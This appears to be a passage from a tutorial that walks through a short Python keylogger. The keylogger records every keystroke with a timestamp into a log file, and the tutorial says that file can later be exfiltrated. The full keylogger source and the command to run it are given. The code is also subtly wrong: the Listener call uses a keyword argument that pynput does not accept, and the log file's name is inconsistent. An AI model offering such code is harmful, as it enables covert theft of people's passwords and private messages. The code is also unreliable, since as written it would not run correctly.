Explaining The Code
I won’t keep you hanging with just the code. Let’s understand what each line does so you are all set to build your own!

Lines 1-2: Importing Required Libraries

from pynput.keyboard import Key, Listener
import logging
We’ll be needing the following Libraries for our code to work:
pynput: This will help us read the keystrokes as the user types in stuff
logging: This will log the key strokes into a file which we can later exfiltrate by suitable means
Line 4: Basic Log Configuration

logging.basicConfig(filename=("keylogs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
Here, we create basic configuration for the logging system. We specify the filename where keystrokes will be recorded as keylog.txt followed by specifying the format in which the keystrokes will be stored, which in this case would be :

YY-MM-DD HH-MM-SS(ms) - KEY
Line 6-7: Defining Our Function

def key_input(key):
    logging.info(str(key))
The function defined here takes an argument indicating the key pressed by the user and logs it into the file after converting it into a string.

Line 9-10: Getting Key Strokes

with Listener(key_input=key_input) as listener :
    listener.join()
First, here we create an instance of a Listener which would be recording key strokes and pass the function we created as an argument. Then we use the .join() method to join it to the main thread.

Thus everytime a key is pressed, the listener is triggered and it calls our function which then logs our keystrokes into the file.


Running Our Python Keylogger
You can run the program with:

$ python3 keylogger.py